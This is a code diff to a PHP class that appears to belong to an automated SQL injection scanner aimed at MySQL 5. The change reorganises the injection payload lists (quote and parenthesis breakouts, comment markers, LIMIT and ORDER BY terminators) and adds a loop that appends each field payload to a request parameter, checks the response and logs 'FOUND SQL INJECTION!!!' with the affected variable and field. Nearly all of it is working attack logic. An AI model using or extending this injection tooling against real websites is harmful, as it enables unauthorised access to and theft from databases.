@@ -16,9 +16,10 @@
 			private	$_useConcat						=	FALSE;		//Concat values with a tag like <aidsql></aidsql>
 			private	$_openTag						=	NULL;
 			private	$_closeTag						=	NULL;
-			private	$_commentPayloads				=	array("/*","--","#");
+			private	$_fieldPayloads				=	array("","'", "%'","')","%')");
 			private	$_terminatingPayloads		=	array("LIMIT 1,1", " ORDER BY 1", "LIMIT 1,1 ORDER BY 1");
-			private	$_stringPayloads				=	array("'", "%'","')","%')");
+			private	$_commentPayloads				=	array("/*","--","#");
+			private	$_currFieldPayload			=	NULL;
 			private	$_currTerminatingPayload	=	NULL;
 			private	$_affectedDatabases			=	array("mysql5");
 
@@ -86,35 +87,45 @@
 
 								$this->_currTerminatingPayload = $terminatingPayload;
 
-								$injection	= $this->makeDiscoveryInjection();
-						
+								$injection	=	$this->makeDiscoveryInjection();
+
 								$this->log("[$variable] Attempt:\t$i",0);
 
-								$matches = $this->analyzeInjection($injection);
+								foreach($this->_fieldPayloads as $FPL){
 
-								$this->log("GOT ".$this->_httpAdapter->getHttpCode(),0,"yellow");
+									$this->_currFieldPayload	=	$FPL;
 
-								if(isset($matches[0])){
+									$matches	=	$this->analyzeInjection($injection);
 
-									$this->_isVulnerable	=	TRUE;
+									$code		=	$this->_httpAdapter->getHttpCode();
+									$color	=	($code==200)	?	"light_cyan"	:	"yellow";
+									$status	=	($code==200)	?	0	:	2;
+							
+									$this->log("HTTP ".$this->_httpAdapter->getHttpCode(),$status,$color);
 
-									$this->log("FOUND SQL INJECTION!!!");
-									$this->log("Affected Variable:\t$variable");
-									$this->log("Affected Fields:\t".implode($matches,","));
-									$this->log("Field Count:\t$i");
+									if(isset($matches[0])){
 
-									$field = $this->pickRandomValue($matches);
+										$this->_isVulnerable	=	TRUE;
 
-									$this->log("Picking field \"$field\" to perform further analysis ...");
+										$this->log("FOUND SQL INJECTION!!!");
+										$this->log("Affected Variable:\t$variable");
+										$this->log("Affected Fields:\t".implode($matches,","));
+										$this->log("Field Count:\t$i");
 
-									//Actually we can have a series of childNodes here any field is good, so we just pick
-									//a random field.
+										$field = $this->pickRandomValue($matches);
 
-									$this->setAffectedVariable($variable,$value);
-									$this->setAffectedField($field);
-									$this->setMaxFields($i);
+										$this->log("Picking field \"$field\" to perform further analysis ...");
 
-									return TRUE;
+										//Actually we can have a series of childNodes here any field is good, so we just pick
+										//a random field.
+
+										$this->setAffectedVariable($variable,$value);
+										$this->setAffectedField($field);
+										$this->setMaxFields($i);
+	
+										return TRUE;
+
+									}
 
 								}
 
@@ -251,10 +262,8 @@
 
 			public function setAffectedField($affectedField=NULL){
 
-				$affectedField = (int)$affectedField;
-
-				if(is_null($affectedField)||$affectedField==0){
-					throw (new \Exception("The affected field cannot be NULL or 0"));
+				if(empty($affectedField)){
+					throw (new \Exception("The affected field cant be empty"));
 				}
 
 				$this->_affectedField = $affectedField;
@@ -463,6 +472,7 @@
 			private function analyzeInjection($injection,$useEndingPayload=TRUE){
 
 				$variable	= $this->_affectedVariable;
+
 				$value		= $variable["value"];
 				$variable	= $variable["variable"];
 
@@ -475,6 +485,8 @@
 					$this->log("Assuming random value for variable $variable. Value is: $value",2,"yellow");
 
 				}
+
+				$value	.= $this->_currFieldPayload;
 
 				if($useEndingPayload){
 
